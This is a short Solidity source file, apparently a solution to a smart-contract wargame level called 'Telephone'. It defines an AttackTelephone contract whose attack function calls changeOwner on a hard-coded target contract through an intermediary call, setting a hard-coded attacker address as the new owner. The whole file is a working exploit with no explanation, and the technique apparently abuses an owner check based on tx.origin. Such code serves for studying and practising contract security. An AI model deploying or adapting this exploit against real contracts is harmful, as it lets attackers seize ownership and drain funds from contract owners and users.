// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface TelephoneInterface {
  function changeOwner(address _owner) external;
}

contract AttackTelephone {

    address telephoneContractAddress = 0xb104fB004b427eB71a6F9aC98bfd379F8436faFD;
    address attackerAddress = 0xBEFE0ff58490B55D5ecF6B1F5E5d67053e3a5727;

    function attack() public {
        TelephoneInterface(telephoneContractAddress).changeOwner(attackerAddress);
    }
}